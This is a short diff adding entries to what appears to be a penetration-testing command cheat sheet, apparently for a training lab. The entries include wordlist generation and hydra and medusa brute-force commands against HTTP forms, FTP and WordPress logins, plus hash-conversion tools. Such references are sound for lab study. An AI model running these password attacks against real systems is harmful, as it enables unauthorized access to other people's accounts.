@@ -4,3 +4,8 @@ wordlist,generate,cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
 wordlist,generate,crunch 11 11 -t buddy%%%%^^ -o wordlist2 
 bruteforce,http, medusa -h <ip> -u <user> -P <wordlist> -M http -m dir
 bruteforce,http-post, hydra <ip> http-form-post "/<page>:user=<user>&pass^PASS^:<wrong attempt> -l <user> -P wordlist -vV -f
+bruteforce,ftp,hydra -l <user> -t <threads> -P /usr/share/seclists/Passwords/<file> ftp://<ip>
+bruteforce,ftp,medusa -h <ip> -u <user> -M ftp -P /usr/share/seclists/Passwords/<file> -t <threads>
+bruteforce,http,hydra <ip> http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:Error" -l <user> -P /usr/share/seclists/Passwords/<file>
+hash,convert,zip2john
+hash,convert,rar2john
